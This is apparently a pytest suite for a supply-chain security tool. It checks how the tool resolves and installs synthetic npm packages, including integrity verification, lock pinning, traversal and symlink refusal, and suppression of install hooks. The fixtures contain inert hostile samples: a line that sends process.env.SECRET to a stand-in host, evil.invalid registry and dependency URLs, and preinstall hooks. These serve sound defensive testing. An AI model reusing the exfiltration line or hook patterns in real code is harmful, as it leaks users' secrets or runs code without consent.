"""Synthetic npm archives are inert: only trusted npm runs, always --ignore-scripts."""
import base64
import hashlib
import io
import json
import shutil
import tarfile
from pathlib import Path

import pytest

from backend.guardian import ingestion, npm_adapter
from backend.guardian.supply_models import AcquisitionError, IntegrityError, InstallError


def package(name='alpha', version='1.0.0', dependencies=None, source='module.exports = 42;', scripts=None, extra=None):
    manifest = {'name': name, 'version': version}
    if dependencies:
        manifest['dependencies'] = dependencies
    if scripts:
        manifest['scripts'] = scripts
    files = {'package/package.json': json.dumps(manifest), 'package/index.js': source, **(extra or {})}
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode='w:gz') as tar:
        for path, content in files.items():
            raw = content.encode()
            info = tarfile.TarInfo(path)
            info.size = len(raw)
            tar.addfile(info, io.BytesIO(raw))
    return manifest, out.getvalue()


def registry(monkeypatch, packages):
    releases = {}
    urls = []
    for manifest, raw in packages:
        meta = dict(manifest)
        name, version = meta['name'], meta['version']
        url = f'https://registry.npmjs.org/{name}/-/{name.split("/")[-1]}-{version}.tgz'
        meta['dist'] = {'tarball': url, 'integrity': 'sha512-' + base64.b64encode(hashlib.sha512(raw).digest()).decode()}
        releases.setdefault(name, {})[version] = (meta, raw)

    def download(url, limit=ingestion.MAX_UPLOAD, timeout=15):
        urls.append(url)
        for name, versions in releases.items():
            if url == 'https://registry.npmjs.org/' + name.replace('/', '%2F').replace('@', '%40'):
                value = {'name': name, 'dist-tags': {'latest': list(versions)[-1]}, 'versions': {v: m for v, (m, _) in versions.items()}}
                return json.dumps(value).encode()
            for meta, raw in versions.values():
                if url == meta['dist']['tarball']:
                    return raw
        raise AssertionError('Unexpected network location: ' + url)
    monkeypatch.setattr(ingestion, 'download', download)
    return releases, urls


def test_npm_direct_transitive_pinning_and_evidence(monkeypatch, tmp_path):
    registry(monkeypatch, [package(dependencies={'beta': '^1.0.0'}), package('beta', source='fetch("https://example.invalid", {body: process.env.SECRET});')])
    plan = npm_adapter.resolve(['alpha@1.0.0'], tmp_path)
    assert len(plan.artifacts) == 2
    alpha, beta = plan.artifacts
    assert alpha.direct and not beta.direct
    assert alpha.dependencies == ['npm:beta@1.0.0']
    assert all(a.verified and hashlib.sha256(a.raw).hexdigest() == a.sha256 for a in plan.artifacts)
    from backend.guardian.engine import analyze
    findings = analyze(beta.files)[2]
    assert any(f.rule == 'SENSITIVE_TRANSMISSION' and f.evidence and f.confidence in ('high', 'medium') for f in findings)
    assert not (tmp_path / 'node_modules').exists()


def test_npm_integrity_failure_before_archive(monkeypatch, tmp_path):
    releases, _ = registry(monkeypatch, [package()])
    releases['alpha']['1.0.0'][0]['dist']['integrity'] = 'sha512-' + base64.b64encode(b'x' * 64).decode()
    monkeypatch.setattr(ingestion, 'archive', lambda *args: pytest.fail('unverified archive parsed'))
    with pytest.raises(IntegrityError):
        npm_adapter.resolve(['alpha'], tmp_path)


def test_npm_lock_pin_kept_even_when_new_release_exists(monkeypatch, tmp_path):
    registry(monkeypatch, [package(), package(version='1.1.0')])
    (tmp_path / 'package.json').write_text(json.dumps({'name': 'project', 'dependencies': {'alpha': '^1.0.0'}}))
    (tmp_path / 'package-lock.json').write_text(json.dumps({'lockfileVersion': 3, 'packages': {'': {'dependencies': {'alpha': '^1.0.0'}}, 'node_modules/alpha': {'version': '1.0.0'}}}))
    plan = npm_adapter.resolve([], tmp_path)
    assert plan.artifacts[0].version == '1.0.0'
    assert json.loads((tmp_path / 'package-lock.json').read_text())['packages']['node_modules/alpha']['version'] == '1.0.0'


@pytest.mark.parametrize('spec', ['git+https://evil.invalid/x', 'https://evil.invalid/p.tgz', 'file:../x', 'npm:other@1.0.0', 'workspace:*'])
def test_npm_nonregistry_dependencies_refused(monkeypatch, tmp_path, spec):
    registry(monkeypatch, [package(dependencies={'beta': spec})])
    with pytest.raises(AcquisitionError, match='registry npm'):
        npm_adapter.resolve(['alpha'], tmp_path)


@pytest.mark.parametrize('feature', ['peerDependencies', 'workspaces', 'overrides', 'bundledDependencies'])
def test_npm_unsupported_resolution_features_fail_closed(monkeypatch, tmp_path, feature):
    manifest, raw = package()
    manifest[feature] = {'beta': '*'}
    registry(monkeypatch, [(manifest, raw)])
    with pytest.raises(AcquisitionError):
        npm_adapter.resolve(['alpha'], tmp_path)


@pytest.mark.parametrize('path', ['package/../../escape.js', '/escape.js', 'package/../index.js'])
def test_npm_traversal_before_install(monkeypatch, tmp_path, path):
    registry(monkeypatch, [package(extra={path: 'evil'})])
    with pytest.raises(AcquisitionError):
        npm_adapter.resolve(['alpha'], tmp_path)
    assert not (tmp_path / 'node_modules').exists()


def test_npm_symlink_member_refused(tmp_path):
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode='w:gz') as tar:
        item = tarfile.TarInfo('package/index.js')
        item.type = tarfile.SYMTYPE
        item.linkname = '/tmp/elsewhere'
        tar.addfile(item)
    artifact = tmp_path / 'alpha.tgz'
    artifact.write_bytes(out.getvalue())
    with pytest.raises(ValueError, match='links'):
        npm_adapter.acquire_local(artifact)


def test_npm_artifact_substitution_rejected(monkeypatch, tmp_path):
    registry(monkeypatch, [package()])
    plan = npm_adapter.resolve(['alpha'], tmp_path)
    plan.artifacts[0].raw = b'substituted'
    with pytest.raises(IntegrityError):
        npm_adapter.install(plan, tmp_path)
    assert not (tmp_path / 'node_modules').exists()


def test_npm_changed_manifest_rejected(monkeypatch, tmp_path):
    registry(monkeypatch, [package()])
    plan = npm_adapter.resolve(['alpha'], tmp_path)
    (tmp_path / 'package.json').write_text('{}')
    with pytest.raises(InstallError, match='changed'):
        npm_adapter.install(plan, tmp_path)


@pytest.mark.skipif(not shutil.which('npm'), reason='trusted npm unavailable')
def test_npm_benign_exact_offline_install_and_deferred_hooks(monkeypatch, tmp_path):
    sentinel = tmp_path / 'must-not-run'
    registry(monkeypatch, [package(scripts={'preinstall': 'node -e "require(\'fs\').writeFileSync(\'' + str(sentinel) + '\',\'bad\')"'})])
    plan = npm_adapter.resolve(['alpha@1.0.0'], tmp_path)
    assert not sentinel.exists()
    npm_adapter.install(plan, tmp_path)
    assert not sentinel.exists()
    installed = json.loads((tmp_path / 'node_modules/alpha/package.json').read_text())
    assert installed['name'] == 'alpha' and installed['version'] == '1.0.0'
    assert (tmp_path / 'node_modules/alpha/index.js').read_text() == plan.artifacts[0].files['index.js']
    assert json.loads((tmp_path / 'package-lock.json').read_text())['packages']['node_modules/alpha']['integrity'].startswith('sha512-')


@pytest.mark.skipif(not shutil.which('npm'), reason='trusted npm unavailable')
def test_npm_transitive_exact_offline_install(monkeypatch, tmp_path):
    registry(monkeypatch, [package(dependencies={'beta': '^1.0.0'}), package('beta')])
    plan = npm_adapter.resolve(['alpha'], tmp_path)
    npm_adapter.install(plan, tmp_path)
    assert (tmp_path / 'node_modules/alpha/node_modules/beta/package.json').is_file()


def test_npm_install_failure_preserves_project(monkeypatch, tmp_path):
    registry(monkeypatch, [package()])
    (tmp_path / 'package.json').write_text('{"name":"project"}')
    (tmp_path / 'node_modules').mkdir()
    (tmp_path / 'node_modules/existing').write_text('keep')
    plan = npm_adapter.resolve(['alpha'], tmp_path)
    monkeypatch.setattr(npm_adapter, '_run', lambda *args, **kwargs: (_ for _ in ()).throw(InstallError('failed')))
    with pytest.raises(InstallError):
        npm_adapter.install(plan, tmp_path)
    assert (tmp_path / 'node_modules/existing').read_text() == 'keep'
    assert (tmp_path / 'package.json').read_text() == '{"name":"project"}'


def test_npm_local_offline_acquisition_unverified(tmp_path):
    _, raw = package()
    path = tmp_path / 'alpha.tgz'
    path.write_bytes(raw)
    artifact = npm_adapter.acquire_local(path)
    assert artifact.name == 'alpha' and artifact.sha256 == hashlib.sha256(raw).hexdigest()
    assert not artifact.verified


def test_npm_resolution_offline_fails_honestly(tmp_path):
    with pytest.raises(AcquisitionError, match='Offline registry resolution'):
        npm_adapter.resolve(['alpha'], tmp_path, offline=True)


def test_npm_hoisted_lock_transitive_versions_remain_pinned(monkeypatch, tmp_path):
    registry(monkeypatch, [package(dependencies={'beta': '^1.0.0'}), package('beta'), package('beta', version='1.1.0')])
    (tmp_path / 'package.json').write_text(json.dumps({'dependencies': {'alpha': '^1.0.0'}}))
    lock = {'lockfileVersion': 3, 'packages': {
        '': {'dependencies': {'alpha': '^1.0.0'}},
        'node_modules/alpha': {'version': '1.0.0', 'dependencies': {'beta': '^1.0.0'}},
        'node_modules/beta': {'version': '1.0.0'},
    }}
    (tmp_path / 'package-lock.json').write_text(json.dumps(lock))
    plan = npm_adapter.resolve([], tmp_path)
    assert [(a.name, a.version) for a in plan.artifacts] == [('alpha', '1.0.0'), ('beta', '1.0.0')]
    assert plan.installer_data['lock']['packages']['node_modules/alpha/node_modules/beta']['version'] == '1.0.0'


def test_npm_cyclic_graph_terminates_with_ancestor_edge(monkeypatch, tmp_path):
    registry(monkeypatch, [package(dependencies={'beta': '1.0.0'}), package('beta', dependencies={'alpha': '1.0.0'})])
    plan = npm_adapter.resolve(['alpha'], tmp_path)
    assert len(plan.artifacts) == 2
    assert plan.artifacts[1].dependencies == ['npm:alpha@1.0.0']


def test_npm_changed_lock_digest_rejected_before_install(monkeypatch, tmp_path):
    registry(monkeypatch, [package()])
    plan = npm_adapter.resolve(['alpha'], tmp_path)
    plan.installer_data['lock']['packages']['node_modules/alpha']['integrity'] = 'sha512-' + base64.b64encode(b'x' * 64).decode()
    with pytest.raises(IntegrityError, match='lock graph'):
        npm_adapter.install(plan, tmp_path)


def test_npm_project_hook_and_configuration_never_copied_to_stage(monkeypatch, tmp_path):
    registry(monkeypatch, [package()])
    marker = tmp_path / 'hook-executed'
    (tmp_path / '.npmrc').write_text('registry=https://evil.invalid\nignore-scripts=false')
    (tmp_path / 'package.json').write_text(json.dumps({'name': 'project', 'scripts': {'preinstall': 'touch ' + str(marker)}}))
    plan = npm_adapter.resolve(['alpha'], tmp_path)
    npm_adapter.install(plan, tmp_path)
    assert not marker.exists()
    assert (tmp_path / 'node_modules/alpha/package.json').exists()


def test_npm_opaque_file_outside_package_root_refused(monkeypatch, tmp_path):
    registry(monkeypatch, [package(extra={'outside/hidden.bin': 'opaque'})])
    with pytest.raises(AcquisitionError, match='canonical package/'):
        npm_adapter.resolve(['alpha'], tmp_path)


def test_npm_opaque_bytes_count_towards_expanded_limit(monkeypatch, tmp_path):
    from dataclasses import replace
    from backend.guardian.config import ArchiveLimits
    _, raw = package(extra={'package/one.bin': 'x' * 100, 'package/two.bin': 'x' * 100})
    with pytest.raises(AcquisitionError, match='expanded-byte'):
        npm_adapter._manifest_files(raw, limits=replace(ArchiveLimits.from_env('npm'), expanded=180))
